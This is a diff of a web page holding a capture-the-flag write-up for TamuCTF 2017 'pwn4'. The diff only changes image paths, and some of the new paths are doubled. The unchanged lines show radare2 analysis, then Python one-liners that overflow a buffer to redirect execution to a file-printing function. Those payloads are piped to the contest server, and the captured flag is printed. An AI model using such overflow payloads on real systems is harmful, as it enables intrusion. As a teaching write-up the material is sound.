@@ -82,7 +82,7 @@
                     <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                         
 
-<p><img src="/assets/1-pwn4_description.png" alt="Pwn4 challenge description" /></p>
+<p><img src="/assets/TamuCTF2017/pwn4/TamuCTF2017/pwn4/1-pwn4_description.png" alt="Pwn4 challenge description" /></p>
 
 <p>Is curious that this specific challenge is more worthy than the previous one (<a href="../pwn3/pwn3.md">pwn3</a>). As we will see it is way easier.</p>
 
@@ -90,7 +90,7 @@
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 pwn4 -c <span class="s1">&#39;aaa; afl&#39;</span>
 </code></pre></div>
 
-<p><img src="/assets/2-pwn4_functions.png" alt="Pwn4 functions" /></p>
+<p><img src="/assets/TamuCTF2017/pwn4/TamuCTF2017/pwn4/2-pwn4_functions.png" alt="Pwn4 functions" /></p>
 
 <p>We can see four interesting functions:</p>
 
@@ -106,7 +106,7 @@
 
 <p>Here they are, take a look at them.</p>
 
-<p><img src="/assets/3-pwn4_functions_code.png" alt="Pwn4 functions code" /></p>
+<p><img src="/assets/TamuCTF2017/pwn4/3-pwn4_functions_code.png" alt="Pwn4 functions code" /></p>
 
 <p>Obviously we should try to execute that <strong><code>sym.flag_func()</code></strong>, it seems it will try print a file (<strong>flag2.txt</strong>, strange name right? why 2?) using the <code>cat</code> command on the remote server. But that function is never called. You can check it on your own with:</p>
 
@@ -139,13 +139,13 @@ Now we create a file with the previously commented file (<strong><code>flag2.txt
 $ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> ./pwn4
 </code></pre></div>
 
-<p><img src="/assets/4-pwn4_printing_flag2.png" alt="Pwn4 printing flag2.txt" /></p>
+<p><img src="/assets/TamuCTF2017/pwn4/4-pwn4_printing_flag2.png" alt="Pwn4 printing flag2.txt" /></p>
 
 <p>Good! what will the remote server say?</p>
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
 </code></pre></div>
 
-<p><img src="/assets/5-pwn4_remote_flag2_content.png" alt="Pwn4 printing flag2.txt" /></p>
+<p><img src="/assets/TamuCTF2017/pwn4/5-pwn4_remote_flag2_content.png" alt="Pwn4 printing flag2.txt" /></p>
 
 <p>Ouch! that file was just a decoy. There must be a file named <strong><code>flag.txt</code></strong>.
 &gt; But how could we executed it? There is only one function which print a file and its name is hardcoded.</p>
@@ -154,7 +154,7 @@ $ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xcb\x84\x04\x0
 The only thing we need to do is to pass a different argument: <strong><code>cat flag.txt</code></strong> instead of <strong><code>cat flag2.txt</code></strong>.</p>
 
 <p>If you inspect all the strings of the binary you may find surprise:
-<img src="/assets/6-pwn4_pointer_flag_file.png" alt="Pwn4 printing flag2.txt" />:</p>
+<img src="/assets/TamuCTF2017/pwn4/6-pwn4_pointer_flag_file.png" alt="Pwn4 printing flag2.txt" />:</p>
 
 <p>As you may know, in order to pass the arguments to the function they need to be pushed into the stack. In case of a string not its value but its reference (a pointer <strong><code>0x0804a028</code></strong>.</p>
 
@@ -172,7 +172,7 @@ The only thing we need to do is to pass a different argument: <strong><code>cat 
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*16 + &quot;\xd9\x84\x04\x08&quot; + &quot;\x28\xa0\x04\x08&quot;)&#39;</span> <span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4324</span>
 </code></pre></div>
 
-<p><img src="/assets/7-pwn4_answer.png" alt="Pwn4 printing flag2.txt" />
+<p><img src="/assets/TamuCTF2017/pwn4/7-pwn4_answer.png" alt="Pwn4 printing flag2.txt" />
 Answer: gigem{R3TURN_0R13NT3D_PR0F1T}</p>
 
 <h3 id="complete-video">Complete video</h3>
